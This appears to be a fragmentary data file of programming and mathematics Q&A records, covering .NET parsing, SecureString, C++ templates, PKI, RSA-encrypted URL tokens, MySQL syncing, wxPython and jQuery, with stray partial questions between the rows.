5972,.net Parse() round float values,"I found one very interesting thing about parsing a string into a float value. The case is that the string value is obtained from a database by using IDbReader Here is an example: If I test just Parse for a constant string, the Parse method works fine: I am not sure why the content of sValue from IDbReader cannot be parsed as original value (as I can see from VS debug). It rounds the float value to a float value with 2 digits after decimal point. How can I get the original value? How I can get the exactly same value back? I am using .Net 2.0 Update: I tried to use GetXXX such as GetFloat or GetDecimal methods to get values directly to a float/decimal value. Unfortunately, all those methods seem having similar rounding issue. Only GetValue() and forcing to string will get the exactly same string value as it is in the database. I thought I could do the conversion to a float or decimal value on .Net side, but the Parse() fails in my case. I am not sure why the rounding happen in Parse(). As some suggested the value are there, and it may be VS debug, watch or log caused rounding. However, when I tried to put the float value to a text box, it is rounded to 2 digits after decimal point.

I'm importing from a flat file dump of data using bulk inserts. I also have an ""Insert On duplicate key, update"" style trigger that will simply update a row if the id already exists. The import data itself doesn't grow much (as far as filesize), it's mostly just that the records are being updated with a small number of new records being inserted.

Here's a transcript of the process: http://pastie.org/private/jt7mxajyyxuzvodch9goq All the tables shrank considerably, but I thought it was interesting that before the vacuum and reindex the largest table was an index that was 3.7GB (bigger than even the largest content table which was 2.8GB) and shrank to 629 MB.

The essence of it is that you are outputting a reduction of the elements encountered since the last 'break' each time that you see a 'break' or you reach the end of the input.

44894,When would I need a SecureString in .NET?,"I'm trying to grok the purpose of .NET's SecureString. From MSDN: An instance of the System.String class is both immutable and, when no longer needed, cannot be programmatically scheduled for garbage collection; that is, the instance is read-only after it is created and it is not possible to predict when the instance will be deleted from computer memory. Consequently, if a String object contains sensitive information such as a password, credit card number, or personal data, there is a risk the information could be revealed after it is used because your application cannot delete the data from computer memory. A SecureString object is similar to a String object in that it has a text value. However, the value of a SecureString object is automatically encrypted, can be modified until your application marks it as read-only, and can be deleted from computer memory by either your application or the .NET Framework garbage collector. The value of an instance of SecureString is automatically encrypted when the instance is initialized or when the value is modified. Your application can render the instance immutable and prevent further modification by invoking the MakeReadOnly method. Is the automatic encryption the big payoff? And why can't I just say: instead of What aspect of SecureString am I missing?","['SecureString password = new SecureString(""password"");\n', 'SecureString pass = new SecureString();\nforeach (char c in ""password"".ToCharArray())\n    pass.AppendChar(c);\n']",False

189946,"C++11: Abstracting over const, volatile, lvalue reference, and rvalue reference qualified member function pointers?","C++03 lets you qualify function parameters as being , , and/or lvalue references (). C++11 adds one more: rvalue references (). Furthermore, C++ lets you overload functions based on the qualifiers of their parameters, so that the most appropriate overload is selected when calling the function. A member function can conceptually be thought of as a function which takes an extra parameter, whose type is a reference to an instance of the class of which it is a member. It's possible to overload a member function based on the qualifiers of this 'extra parameter' in much the same way as any other parameter. This is expressed by putting the qualifiers at the end of the function signature: In C++03, and qualifiers are possible, and C++11 also allows and ( could theoretically have been allowed in C++03, but it wasn't). Any combination of qualifiers can be used, with the exception that and are mutually exclusive, which makes for 2^2 = 4 possibilities in C++03 and 2^4-4 = 12 in C++11. This can be quite a pain when you want to work with member function pointers, because they aren't even a little bit polymorphic in these qualifiers: the qualifiers on the "" type"" of a member function pointer passed as an argument must exactly match those on the type of the parameter it's being passed as. C++ also offers no explicit facility to abstract over qualifiers. In C++03 this was mostly OK, because you would have to write a version and a non- version and no one cares about , but in the pathological case in C++11 (which is not as uncommon as it is pathological) you could have to manually write as many as 12 overloads. Per function. I was very happy to discover that if you are passing the type of the enclosing class as a template parameter and derive the type of a member function pointer from it, that and qualifiers are allowed and propagated as you would expect: This is a great deal nicer than having to write out all of the cases manually. Unfortunately, it doesn't seem to work for and . GCC 4.7 says: error: forming pointer to reference type ‘Baz&amp;&amp;’ But that's not too surprising, given that GCC as of 4.7 doesn't yet have support for reference qualifiers on . I also tried it with Clang 3.0, which does have such support: error: member pointer refers into non-class type 'Baz &amp;&amp;' Oh, well. Am I correct in concluding that this is not possible, and that there's no way to abstract over reference qualifiers on the """" of member function pointers?

197750,Header-only library circular dependency,"I'm trying to create a header-only C++ library around an external C API. The C API uses pointers as handles. Here's the idea: The problem here is that (a) the Handle has to keep a reference to the Resource, and (b) the Resource needs to be able to cast the Handle to a void *. Unfortunately this leads to a circular dependency. Any ideas on how to restructure this? NOTE: The answer is not to simply ""include xxx.hpp"" or forward declare one of the classes. This needs to be restructured somehow, I just can't quite see how. Adding a as a forward declaration to the top of the Resource file doesn't work, because the cast is part of the Handle definition that Resource still can't see.

321987,Ideal way/architecture to deliver large data over Web Services,"We are trying to design 6 web services, which will serve another client component. The client component requires data from the web service we are implementing. Now, the problem is, there is not 1 Web Service we are implementing, there is one Web Service which the client component hits, this initiates a series (5 more) of Web Services which gather data from their respective data stores and finally provide the data back to the original Web Service, which then delivers the data back to the client component. So, if the requested data becomes huge, then, this will be a serious problem for our internal communication channel. So, what do you guys suggest? What can be done to avoid overloading of the communication channel between the internal Web Service and at the same time, also delivering the data to the client component.

Inputs: points - a set of (x,y) coordinates for the data points; x and y are non-negative avgX, avgY - the average of the x and y coordinates of all data points Outputs: aDist, bDist - the lengths of the major and minor axes I have checked the inputs in the debugger, and they look OK. I have tried this code for some simple shapes (circles, ellipses, rectangles) with no rotation, and aDist and bDist are proportional to the shape but always too large. For example, if 'points' is a 100x100 circle, then aDist and bDist are 582. Update: After summing up , I now divide each element by , as Mike suggested. If , then and are now 5, as expected which is too small. As more pixels are added to that square, and gives a radius of sqrt(18.75)=4.33.","['        // Find a and b -- use principal component analysis\n    // http://ask.metafilter.com/36213/Best-Fit-Ellipse (2nd reply)\n    // http://number-none.com/product/My%20Friend,%20the%20Covariance%20Body/index.html\n\n    double mat[2][2];   // Will be the covariance matrix. \n                        // Eigenvectors will be major &amp; minor axes.

By Lebesgue's theorem on monotone functions, each $f_n$ is differentiable almost everywhere, and it is clear that $f$ is monotone as well, so $f$ is also differentiable a.e.

425855,Some understanding gaps about Public Key Infrastructure workflow,"Recently, I have stumbled upon the basic understanding about PKI work-in-action process. I have looked at major articles about the principles but still I feel quite dumb to understand this process. I understand that PKI is not for „My blog„ but for the sake of simplicity lets walk through simple example “My e-Shop” (for example apache and php) and simple concepts. I wrote some statements that might be vague or even wrong but that’s what I want to know about the process of PKI: “My e-Shop” as a company needs to be “certified” at some third party CA. That means I need to buy some kind of 1 year membership at that CA, and then, they will register “My e-Shop” at their systems and issue me some stuff like a certificate and a pair of unique public and private keys. Will I get some certificate-file? Issued certificate is filled with my info and public key and stored in some file at my webserver. The certificate verifies that “My e-shop” is not a bureau of thieves. Every time users access “My e-shop” through “https” their browsers “silently” checks the presented certificate of “My e-shop” with the one that is registered at CA. What about users? Do their browsers generate local public+private keys when entering “My e-shop” via https? When some user enters “My e-shop” via https the following happens: “My e-shop” (webserver) gets the public key (PK1) of the user. The server silently presents the certificate of “My e-shop” to the user, so the users gets the public key (PK2) of “My e-shop”. After some silent checking the browser of the user validates presented certiticate and a secure pipe is established. When a user sends a request via secure pipe the requests is encrypted with public key of “My e-shop”. Then, web server decrypts the request with its private key. Then, web server sends encrypted response with a public key of the user. At the end, the browser of the user decrypts the response with his private key.",[],False

Then fixed that, and now I have 4.3.2 saying that it is running my app on my iPhone, but its not showing up on my phone.

451502,More on quintic polynomials with Galois Group A_5 - is there an easy example?,"In a previous question on the same topic I asked about explicit examples of quintic polynomials having integer coefficients with Galois Group $A_5$. Answers and comments established the following: (i) Some examples (ii) A theorem of Dedekind which shows how factorisations modulo $p$ tell you cycle types which are definitely present in the Galois group (iii) It is possible to achieve $A_5$ in a polynomial with five real roots, hence we can't assume that complex conjugation is the only source of a transposition (this latter observation is more obvious than it first seems, but conjugation is the easy route to an element of order 2 in the Galois Group) (iv) One can exclude a transposition (hence verify that only even permutations occur) if the discriminant is a square My question is mainly about point (iv). It is a mechanical process to compute the discriminant of a quintic - so in one sense this is already ""easy"". However it is not an easy process by hand or by memory - unless someone persuades me otherwise. And my main question is whether there is an example where this can be avoided through some other observation or trick, which makes the example ""easier"" to remember.",[],False

Child needs access to the session as well, so I cannot encapsulate all the work in one method: I cannot wrap the whole application in a servlet Filter as I need information from the Jersey-level to construct my session. Now I could just open it in MyResource, use a regular servlet filter to make sure I always close it, but then I don't know when to rollback and when to commit the session. I could use an ExceptionMapper to be notified of all exceptions, but that would need to be an ExceptionMapper, and this just seems so extremely ugly, with the conceptual try/finally spread over three classes with different lifetimes and so on.

So instead of 100+ translation units I ended up with only 8 translation units. The compile time became 4-5 times shorter. The downsides are that you have to manually include all the *.cpp files (but it's not really a maintenance nightmare since if you forget to include something the linker will remind you), and that some VS IDE conveniences are not working with this scheme, e.g. Go To/ Move to Implementation etc. So the question is, is having lots of cpp translation units really the only true way?

I don't currently have any diagnostics on the client side, just the running Flash application. So we have no logs or standard error messages. The server device is basically a black box, but it does seem clear that the server never gets the request from the client. This suggests that the client was unable to open the socket. A basic Web search suggests that not much is known about this situation. Any thoughts about what's going wrong here? For example, maybe XMLSocket just doesn't work in Android?

So I would create two separate DHTs on the two groups of three servers and when they friend each other I would like to join the DHTs. I would like to this consistently.

1006191,Animating the offset of the scrollView in a UICollectionView/UITableView causes prematurely disappearing cells,"We have a UICollectionView with a custom layout very similar to UITableView (it scrolls vertically). The UICollectionView displays only 3 cells simultaneously, with one of them being the currently active cell: (The active cell here is #2.) The cells are roughly 280 points high, so only the active cell is fully visible on the screen. The user doesn't directly scroll the view to navigate, instead, she swipes the active cell horizontally to advance to the next cell. We then do some fancy animations and scroll the UICollectionView so the next cell is in the ""active"" position, thus making it the active one, moving the old one away and bringing up the next cell in the queue: The problem here is setting the UICollectionView's offset. We currently set it in a UIView animation block () along with three other animating properties, which mostly works great, but causes the first cell (the previously active one, in the latter case, #2) to vanish as soon as the animation starts running, even before the delay interval completes. This is definitely not ideal. I've thought of some solutions, but can't figure out the best one: Absurdly enlarge the UICollectionView's frame to fit five cells instead of three, thus forcing it to keep the cells in memory even if they are offscreen. I've tried this and it works, but it sounds like an awfully dirty hack. Take a snapshot of the rendered content of the vanishing cell, put it in a UIImageView, add the UIImageView as a subview of the scrollView just before the cell goes away in the exact same position of the old cell, removing it once the animation ends. Sounds less sucky than the previous option (memory-wise, at least), but still kinda hacky. I also don't know the best way to accomplish this, please point me in the right direction. Switch to UIScrollView's . We actually used to have this, and it fixed the disappearing cell issue, but running this in parallel with the other UIView animations apparently competes for the attention of the main thread, thus creating a terribly choppy animation on single-core devices (iPhone 3GS/4). It also doesn't allow us to change the duration or easing of the animation, so it feels out of sync with the rest. Still an option if we can find a way to make it work in harmony with the UIView block animations. Switch to UICollectionView's . Haven't tried this, but it has a big downside: it only takes 3 possible constants (that apply to this case, at least) for the target scroll position: , and . The active cell could vary its height, but it always has to be 35 points from the top of the window, and these options don't provide enough control to accomplish the design. It could also potentially be just as problematic as 3.1. Still an option because there might be a way to go around the scroll position thing that I don't know of, and it might not have the same issue with the main thread, which seems unlikely. Any help will be greatly appreciated. Please ask if you need clarification.

The way my config is done, it would be a bug but before filing one I would like to know if anyone had that issue and if they found a way to fix it (ie is it really a bug).

In C++, you can automatically access any class variables without a prefix, in PHP, it appears that you need to prefix all such accesses (variables and function) with . I know what is (or at least I think so, a pointer to the current class instance), but I'm not sure whether its required or preferred, or if there is any alternatives. My class will be using other functions within the same class (ie, itself) fairly heavily, so having to type every time is going to get time consuming quite quickly. The classes themselves are likely to be singletons, so I'm not sure whether to actually use a class, or just prefix the functions with an identifier.","['this-&gt;', 'this', 'this-&gt;']",False

The pattern I know is this: Every successive value increases by 8 more than the last value increased by, except for the first value which is increased by (7 + first value). For instance, 3 in pattern 1 is increased by (7 + 3): 3 + 10 = 13 13 is then increased by 8 more than 10: 13 + 18 = 31 31 is then increased by 8 more than 18: 31 + 26 = 57 making a(4) = 57 Now how do I convert this knowledge into a function so that I don't have to write a programmatic loop every time I want to find x(n)?",[],False

When it drops, I still see the lights blinking on the NIC card, but cannot pass packets even to the router. Windows does not report the connection or the cable as disconnected when this problem is occurring. When the issue occurs, I can't ping the gateway, do DNS lookups or pass any packets as far as I can tell. Ping tests all just time out when the problem is going on. The problem will persist until I disconnect and reconnect the CAT-5e wire, or disable and re-enable the NIC. As soon as I do one of those 2 things, connectivity immediately returns (and works for another hour or so). I am running a legitimate copy of Windows 7 Home Premium 64-bit on an HP Pavilion. All of the latest Windows updates and the latest firmware drivers are installed. My Ethernet connection is a wired Local Area Connection with a static IP address, gateway and DNS.

NIC Power Management, Energy Efficient Ethernet, and Link Down Power Saving are all turned off. On the NIC, ARP/Large Send/IPv4,TCP,UDP Checksum/NS Offload, and Flow Control are all on. Receive Buffer Size on the NIC is 64Kb (512 buffers). Receive Side Scaling on. 128 Transmit Buffers. Interrupt Moderation is turned on. Magic Packet features are turned off. Optimal Performance enabled. NIC Speed and Duplex are set to 100mbps Full Duplex wherever possible (automatic was also tried). 802.1X authentication (EAP or PEAP) is disabled. Auto connection logic is disabled. Connection routes through two switches into a Belkin router; other devices on same networks unaffected. Much of my data is stored on a Network Attached Storage device, with UNC shares mapped to drive letters. Other Windows, Mac and Linux devices connected to the same NAS device have no problems staying connected. I have tried swapping out the CAT-5e cables for other cables, and even ran them through a cable tester to make sure they're working.

1289555,"Automatic Website Login, Long URLs, Encryption","I'm building a secure payment portal. We currently have two applications that will be using this. One is a web application, the other a desktop app. Both of these require users to login/authenticate, the same credentials can be used for either application. I want to build an automatic login mechanism that will fill in all the various login/order details and be able to call this from either app mentioned above. I've been thinking that the best way to do this is to pass this information encrypted through the URL. ie https://mysite.com/TakePayment.aspx?id=GT2jkjh3.... Since we don't want to integrate the payment processing too tightly into the desktop app to reduce our PCI scope, we decided to have it open the browser to a central, secured payment page through a simple shell execute with the full URL causing the default browser to open that page. Originally we were using AES for the encryption, but this is currently being re-examined as we would prefer not having to give out the key to the end user (AES is symmetric, symmetric encryption = both parties need the private key, why bother even encrypting then since we're going to be distributing the app?) So I'm looking at switching it over to use Public Key Encryption with the built in RSA routines within .NET After coding up the RSA portion I noticed most examples on the net used 1024bits for the key-length, I went with this and now have our portal working with public key encryption, however the URLs generated are much much longer than when I was using AES so it made me start researching what the max limits for URLs are. http://www.boutell.com/newfaq/misc/urllength.html Says that IE is the limiting browser at about 2048 characters in the path portion. My initial tests with the RSA encryption show my urls will be around 1400 chars long. My questions boil down to this: 1) Is there a better way for passing information from a desktop app to a website that I'm not thinking of? I'd prefer it be just as easy to use from another web page as it is from the desktop, hence my current solution. 2) Is 1024 bit RSA keys necessary? Or overkill for something like this? A shorter key would mean shorter encrypted text right? 3) Are there any other unforeseen problems with URLs in the 1200-1400 character range? Proxies? Firewalls? Web-Accelerators? Thanks Update 12/11/2011: Come to find out, the method that we ended up going with here ended up biting us in the ass recently (or rather we found out about it today, even though the problem was a very sporadic and difficult one to track down..) The plain text token that we encrypted was originally rather small, only a hundred bytes or so. This is what resulted in my test URLs being approximately 1400 bytes long. Through feature creep we've been required to add more data to the token, and the average URL length jumped to 1700-1800 in length. Once the length of our plain text hits 173 characters long and above however, the URL length jumps again, this time up to 2080+ or so, which now causes problems for IE. After some investigation in how RSA encryption works, this should have been totally expected, but was an oversight on my part originally. We're using 1024 bit RSA encryption, which means that the maximum data block size that can be encrypted is 1024/8 - 24 = 86 bytes, every 86 bytes needs to be ""chopped up"" and encrypted separately, so at 86 * 2 = 172, we're only encrypting two blocks, above that we're encrypting three, four, five, etc. By passing 172, our cipher text length grew so long the URL's are now too long.. I'm probably messing up the explanation a little here, but that's the general gist of it.. It seems we'll be looking at designing a better way for this to work, as it can be expected they'll want ""more features"" to be added in the future and thus our token will grow ever larger...",[],False

The values of this matrix are scaled to Alpha levels to illustrate intensity, and the coordinates for the matrix are simply extrapolated from row and column indexes. Below is my onDraw routine.

Then it starts on the next column, where the previous column is still displayed and so forth. At this stage when all columns are full it stars from the first column again, drawing on top of previous elements.

1521781,Practical applications of first order exact ODE?,"In elementary ODE textbooks, an early chapter is usually dedicated to first order equations. It is very common to see individual sections dedicated to separable equations, exact equations, and general first order linear equations (solved via an integrating factor), not necessarily in that order. Common practical applications in these texts include population growth/decay, mixing problems, draining tank/Torricelli's Law problems, projectile motion, Newton's Law of Cooling, orthogonal trajectories, melting snowball type problems, certain basic circuits, growth of an annuity, and logistic population models. (This is just off the top of my head so maybe I am missing other popular ones.) However, all of these end up as separable or first order linear problems and are solved accordingly. Are there practical applications that lead to first order ODEs which are (exclusively) exact? Edit: To clarify, I am not saying that exact equations are never useful. I am simply inquiring about their relevance/applicability in the very particular context mentioned above. To put the question another way, can you briefly state (e.g., in the form of an exercise that would appear in popular undergrad ODE books like Boyce &amp; DePrima; Zill; Nagle/Saff/Snider; Edwards &amp; Penney; etc.) an application problem modeled by a first order exact ODE (which is not separable or linear) and that is ""doable"" by hand?

In short, I'm looking for something that will give me a unique UserId for users -before- they are logged in or before they create an account. I would like the user to be able to personalize the site to a certain extent -before- they go about the work if creating an account. I realize that work would be lost if they clear their cookies. I store personalized settings in a table with their ASP.NET Auth UserId. I'm hoping that users get assigned a cookie-based UserId even before they log in and create an account, rather than every ""guest"" having the same ""guest id"". If and when they do create an account or log in I'd have to migrate their saved settings to their ""permanent"" UserId, but that's ok with me. I could re-invent something, creating a Guid and storing it in a cookie, but I'd like to avoid reinventing the wheel if there's already a mechanism in ASP.NET. Thanks! Dave",[],False

1733519,Can read/write jobs be put in a queue?,"I share a server with HAL. The server has 32 GB of memory. I rarely use more than 1GB of memory, and when I do, it is for a few minutes at a time, and I don't mind sending such jobs to the back of the line. HAL read/writes large files (e.g. using gunzip). This can take up to 100% of the memory CPU, intermittently, for hours. This is usually done overnight, but when running, will make even simple commands such as take 30s, opening can take minutes. I would like to be able to reserve 1GB for use by processes that use &lt;&lt; 1GB (like a text editor). I would also like to stay out of HAL's way, and see no reason that this should be an issue. HAL says that a queueing system (like PBS) can not be used to put a low priority on read/write, e.g. to leave 1GB of memory always available when large jobs are running. In his words: the script used to gunzip snags all the procs it can because the data is large... queueing would not solve this... during transfer of files from (that server) to (this server), an inflation step does lots of read/write Why couldn't queuing solve this problem?

However, the functional level of the domain has not yet been updated for the 2008 R2 servers, just in the long-shot case of the need for a rollback to the old controllers. I expect to have the all clear to update the domain by next weekend. I also want to note that our desktop clients are still 95% Windows XP. However, we're about to start a project to update our 200 or so clients to Windows 7 before the end of the calendar year. Is there any advantage to holding the domain at the 2003 functional level while we are still supporting more Windows XP than Windows 7, especially given that some of the management stations are still XP? Update: I forgot to mention earlier that we still have a pair of windows 2000 servers (not domain controllers) that support some legacy software.

1865721,How to override WebServiceHostFactory MaxReceivedMessageSize?,"There are a lot of similar questions out there, but I have tried every solution in every one of them to no avail. We have a web service that initialises with WebServiceHostFactory, but if any more than 64k is thrown at it, we get a '400 Bad Request'. Normally, this would just be resolved by bumping up the MaxReceivedMessageSize, MaxBufferSize and MaxBufferPoolSize. The problem is that using the WebServiceHostFactory, the Web.Config is completely ignored. No changes I make in the ServiceModel section reflect in the service at all. It would be nice to just completely ditch WebServiceHostFactory and set up the web.config from scratch, but our service will not run without it. One of the methods has a stream parameter as well as some other string params. Without the factory, we get So it is not an option to remove the factory. I can't work out exactly what the factory is doing that fixes this error but I spent 4 days on it and never got anywhere. I've also tried overriding MaxReceivedMessageSize programatically, with some examples I found on around the place: The first doesn't work as the factory creates a CustomBinding which cannot be cast to a WebHttpBinding. The second doesn't work as it seems the binding elements are read only - no matter what I set the elements to, nothing changes, which I have verified by reading the values back after 'changing' them. The third was a last ditch attempt to try to throw a new binding element in there, but of course this failed as well. Now we are completely at a loss. How can we get this thing to run?

1869664,"wx.Gauge fails to update beyond 25% in Windows, works in Linux","I seem to have nothing but trouble with wxPython and cross-platform compatibility :( I have the function below. It's called when the user clicks a button, it does some work which may take a while, during which a progress gauge is shown in the status bar. The calls to are apparently needed under Linux, otherwise the gauge doesn't update until the function exits which makes it kinda pointless. These calls seem to have no effect under Windows (Win 7 at least). The whole thing works perfectly under Linux (with the calls to Update()), but on Windows 7 the gauge seems to stop around the 20-25% mark, a while before the function exits. So it moves as it should until it reaches ~25%, then the gauge stops moving for no apparent reason but the function continues on just fine and exits with the proper output. In my attempt to find out the problem, I tried inserting a line just before updating the gauge inside the loop, thinking maybe the value of wasn't what I thought it should be. To my big surprise, the gauge now worked as it should, but the moment I remove that it stops working. I can also replace the print with a call to , but even with such a short sleep the process still grinds to almost a halt, and if I lower it even further the problem returns, so it's hardly very helpful. I can't figure out what is going on or how to fix it, but I guess somehow things move too fast under Windows so that doesn't get updated properly after a while and just stays at a fixed value (~25). I have no idea why that would be, however, it makes no sense to me. And of course, neither nor are good solutions. Even if I print out ""nothing"", Windows still opens another window for the non-existent output, which is annoying. Let me know if you need further info or code. Edit: Ok, here's a working application which (for me at least) has the problem. It's still pretty long, but I tried to cut out everything not related to the problem at hand. It works on Linux, just like the complete app. Under Windows it either fails or works depending on the value of in the Go function. If I increase its value to 1000000 (1 million) the problem goes away. I suspect this may depend on the system, so if it works for you try to tweak the value of . It may also be because I changed it so it s a static text rather than calling a generator as it does in the original code. Still, with the current value of (100000) it does fail on Windows for me. Edit 2: Below is an even simpler version of the code. I don't think I can make it much smaller. It still has the problem for me. I can run it from within IDLE, or directly by double clicking the .py file in Windows, either way works the same. I tried with various values of . It seems the problem doesn't actually go away as I first said, instead when I increase the gauge just reaches further and further before the is called. At the current value of 1.000.000 this shorter version reaches around 50%. In the longer version above, a value of 1.000.000 reaches around 90%, a value of 100.000 reaches around 25%, and a value of 10.000 only reaches around 10%. In the version below, once the is called, the progress continues on and reaches 99% even though the loop must have ended by then. In the original version the call to , which takes a few seconds when numwords is high, must have caused the gauge to pause. So I think that what happens is this: In the loop the gauge only reaches a certain point, when the loop exits the function continues on while the gauge stays still, and when the function exits the gauge continues on until it reaches 99%. Because a print statement doesn't take a lot of time, the version below makes it seem like the gauge moves smoothly from 0% to 99%, but the suggests otherwise.","[""def Go(self, event):       \n    progress = 0\n    self.statbar.setprogress(progress)\n    self.Update()\n\n    # ...\n\n    for i in range(1, numwords + 1):\n        progress = int(((float(i) / float(numwords)) * 100) -

So up to the first 9 characters everything is fine, but once you have more than nine, you need to extend the size of the array to store your character. So I thought the easiest way of doing this was to use strcat like: The string prints out what I expect when I do printf(orig), but I'm worried because I didn't extend the size of orig, since is still 5, but should be bigger due to adding the temps.

Problem : If $p$ is a sublinear functional on a real vector space $X$, show that there exists linear functional $f$ on $X$ such that $-p(-x) \leq f(x) \leq p(x)$ Here sublinear functional $p$ means that $p(x+y)\leq p(x) + p(y)$ and $p(ax) = ap(x)$ for all nonnegative $a$ Note that Hahn-Banach theorem implies that there exists a liner functional $f$ with $f(x) \leq p(x)$. Since $q(x) = -p(-x)$ is superlinear, then there exists a linear functional $g(x)$ with $q(x) \leq g(x)$. But I cannot go further. If $p$ is linear then we are done. If $p$ is a norm, then $f$ must be 0. So I have subquestions. Question 1 : If $ X$ is finite dimensional, then $p$ is either a linear functional or a norm. Question 2 : If $X$ is infinite dimensional, give an example of nontrivial $p$. Thank you in advance.",[],False

2010691,"Dealing with ""Coder's Block"" (or blank form syndrome)","I know this is the sort of somewhat open-ended question that we're discouraged from asking, but there are lots of open-ended questions around already, and this is something quite relevant to me right now. Do you ever get those times when you're about to start work on a new function/feature of an established system, and you get ""coder's block""?. It's like a mental freeze at the sight of a large, completely unpopulated dialog, or an empty code file with just the stub reference headers etc. Do you ever have that 'ulp' moment that seems to sap all your momentum and leave you wide open to distractions (surfing the web for inspiration, checking out 'crackoverflow' etc)? Not that I'd wish it on anyone, but hopefully some of you do, and hopefully some of you can suggest tips or strategies for overcoming the situation, regaining your momentum and becoming productive again. I usually try to reduce what I'm about to do down to absurdly small steps, in the hope that as the job becomes just a series of 'doh' tasks, I'll kickstart myself into working through them. However sometimes, particularly when a deadline is looming, I'll get overwhelmed by this approach as I realise I probably don't have enough time to do all of those tiny steps properly. Those are the darkest moments, (often literally) just before dawn! This situation can be particularly crippling if you mostly work alone, too. Any thoughts or suggestions?

Here's how it works. user sees a tableview with two entires one for each database. they can press a button to download the database and when the download starts that fires off the asynch URL connection,etc. This works to a certain extent however it's not that simple. here's what i want it to do. download the main update URL (works ok) then download a secondary URL. then apply the first URL content to the sqlite store (code written for that) then apply the 2nd URL content to the sqlite store (code written for that) (All the while showing progress to the user) when the downloads were synch it was easy as i just waited for them to finish in order to fire the next activity off but when using the asynch method i'm struggling with how to get them to wait. Step 3 depends upon step 1 finishing and step 4 depends on step 2 finishing and overall success relies on all finishing. step 4 needs to wait for step 3 to finish otherwise the database locks will cause a clash. the second complication is that if the user presses the second button while the first is downloading then steps 3, 4 will clash if they execute at the same time as the first row is accessing the database.

2086633,How to synchronize local MySQL (full access) to remote one (PHP only),"Our scenario is a local Linux MySQL server on which we can do whatever we want including installing stuff and setting up cronjobs, and a remote one which we can access only via PHP. The remote one is the usual LAMP hosting service so we can upload whatever PHP we want but only the php scripts themselves from localhost will be able to connect to MySQL, we can't directly connect to the db from outside. There is FTP to upload and manage PHP files. The local server runs some business software, and we wrote scripts to get some data from that software. We need to load that data up in some dedicated tables on the website MySQL hosted somewhere else. For testing purposes we exported the local db (using a local phpMyAdmin) and imported it on the remote system (using the remote phpMyAdmin), of course it works fine. Now we need to automatize this. Our ""synchronization"" is actually a full erase of the remote end and then we re-import everything from the local db. This is gonna happen every night. The first idea is a local cron job that exports via mysqldump, uploads via FTP, wget's a remote php file URL that (after some credentials checking) finally runs the uploaded SQL. Sort of blind, stupid script... should work well as long as I keep strangers outside of the SQL upload / SQL import area. Rather than re-inventing the wheel, is something out there that could achieve the same result, maybe in some more intelligent way that I'm not thinking of? thanks.",[],False

2096927,How to calculate the rotation matrix between 2 3D triangles?,"I need to calculate the rotation matrix and the translation vector between 2 given triangles in Euclidean space. This is really just a rotation and a translation, the lengths of sides of the triangle are equal. Coordinates of the points are real. $P_1, P_2, P_3$ are the 3 points of the 1st triangle, $Q_1, Q_2, Q_3$ are the 3 points of the 2nd. My idea was: I translate the center of the triangles to the point of origin with $t_1 := \frac{P_1+P_2+P_3}{3}$, $P'_i = P_i-t_1$ and $t_2 := \frac{Q_1+Q_2+Q_3}{3}$, $Q'_i = Q_i-t_1$ and then I only need to solve the set of 9 linear equations with 9 unknown (the 9 entries of the rotation matrix $R$): $$ Q'_i = R.P'_i $$ Afterwards I could calculate the translation with $$ t = t_2 - R.t_1 $$ The problem is: after I translate the triangles to the point of origin the points are linearly dependent ($P_3 = -P_1 - P_2$) So in fact I only have 6 equation with 9 unknown, which allows multiple solutions for $R$. But I need ""one"" precise solution, because the triangles are just parts of two identical models, which I need the rotation for. I think the approach will work, if I use 4 points instead of 3. But can I somehow calculate the rotation matrix with ""only"" 3 points?",[],False

2170186,Max-Cut Of Minor Closed Family,"It's well known that planar graphs from a closed-family with forbidden minors $K_{3,3}, K_{5}$, graphs with bounded treewidth also are closed family graphs with no $H_{k}$ as minor. I assume that graphs with bounded max cut form closed family graphs. Given arbitrarily graph $G$ that doesn't contain $H$ as a minor, how to find max cut approximately. Thanks! Addendum: The relevant topic can be found on On the complexity of the Maximum Cut problem Chapter 6. Graphs with bounded treewidth. The PTAS begins with making modification to the tree decomposition without increasing it's treewidth. 1) $T$ is a binary tree. 2) If a node $i \in I$ has two children $j_{1}$ and $j_{2}$, then $X_{i}=X_{j1}=X_{j2}$. 3) If a node $i \in I$ has one child $j$, then either $X_{j} \subset X_{i}$ and $|X_{i}-X_{j}|=1$, or $X_{i} \subset X_{j}$ and $|X_{j}-X_{i}|=1$.

2403755,Apply CSS to jQuery Dialog Buttons,"So I currently have a jQuery dialog with two buttons: Save and Close. I create the dialog using the code below: However, both buttons are the same color when this code is used. I'd like my Cancel button to be a different color than my Save. Is there a way to do this using some built in jQuery options? I didn't get much help from the documentation. Note that the Cancel button I'm creating is a pre-defined type, but 'Save' I'm defining myself. Not sure if that will have any bearing on the issue. Any help would be appreciated. Thanks. UPDATE: Consensus was that there were two roads to travel here: Inspect the HTML using a Firefox plugin like firebug, and note the CSS classes that jQuery is applying to the buttons, and take a stab at overriding them. Note: in my HTML, both buttons were used the exact same CSS classes and no unique IDs, so this option was out. Use a jQuery selector on dialog open to catch the button that I wanted, and add a CSS class to it then. I went with the second option, and used the jQuery find() method as I think this is more appropriate than using :first or :first-child b/c the button that I wanted to change wasn't necessarily the first button listed in the markup. Using find, I can just specify the name of the button, and add CSS that way. The code I ended up with is below:","[""$dialogDiv.dialog({\n autoOpen: false,\n modal: true,\n width: 600,\n resizable: false,\n buttons: {\n  Cancel: function() {\n                        // Cancel code here\n  },\n  'Save': function() {\n                        // Save code here\n  }\n },\n close: function() {\n  // Close code here (incidentally, same as Cancel code)\n }\n});\n"", '$dialogDiv.dialog({\n autoOpen: false,\n modal: true,\n width: 600,\n resizable: false,\n buttons: {\n  Cancel: function() {\n                        // Cancel code here\n  },\n  \'Save\': function() {\n                        // Save code here\n  }\n },\n        open: function() {\n            $(\'.ui-dialog-buttonpane\').find(\'button:contains(""Cancel"")\').addClass(\'cancelButtonClass\');\n        }\n close: function() {\n  // Close code here (incidentally, same as Cancel code)\n }\n});\n']",False

But what if you want to draw a line based on user input? That method wouldn't work then would it? For example, what is the simplest code for which I could draw a circle where the user touches the screen?

